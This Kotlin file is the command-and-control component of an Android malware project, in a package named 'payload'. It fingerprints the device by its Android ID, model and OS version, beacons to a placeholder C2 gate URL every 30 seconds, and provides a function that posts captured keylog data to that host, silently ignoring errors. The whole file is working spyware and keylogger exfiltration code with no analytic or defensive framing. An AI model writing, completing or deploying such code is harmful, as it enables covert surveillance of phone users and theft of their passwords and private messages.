package com.anonymousbeta.payload

import android.content.Context
import android.os.Build
import android.provider.Settings
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

object C2Client {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val running = AtomicBoolean(false)
    private lateinit var appContext: Context
    private var c2Url = "https://your-c2-domain.com/gate"
    private var deviceId = ""

    fun start(context: Context) {
        if (running.getAndSet(true)) return
        appContext = context.applicationContext
        deviceId = Settings.Secure.getString(
            appContext.contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        scope.launch {
            while (isActive) {
                try {
                    beacon()
                } catch (_: Exception) {}
                delay(30_000)
            }
        }
    }

    fun sendKeylog(data: String) {
        scope.launch {
            try {
                post(mapOf(
                    "type" to "keylog",
                    "id" to deviceId,
                    "data" to data,
                    "ts" to System.currentTimeMillis()
                ))
            } catch (_: Exception) {}
        }
    }

    private fun beacon() {
        val info = JSONObject().apply {
            put("type", "beacon")
            put("id", deviceId)
            put("model", Build.MODEL)
            put("android", Build.VERSION.RELEASE)
            put("sdk", Build.VERSION.SDK_INT)
        }
        post(info.toMap())
    }

    private fun post(payload: Map<String, Any?>) {
        val url = URL(c2Url)
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "application/json")
        conn.doOutput = true
        conn.connectTimeout = 12_000
        conn.readTimeout = 12_000

        OutputStreamWriter(conn.outputStream).use { it.write(JSONObject(payload).toString()) }
        conn.responseCode
        conn.disconnect()
    }

    private fun JSONObject.toMap(): Map<String, Any?> {
        val map = mutableMapOf<String, Any?>()
        keys().forEach { map[it] = get(it) }
        return map
    }
}
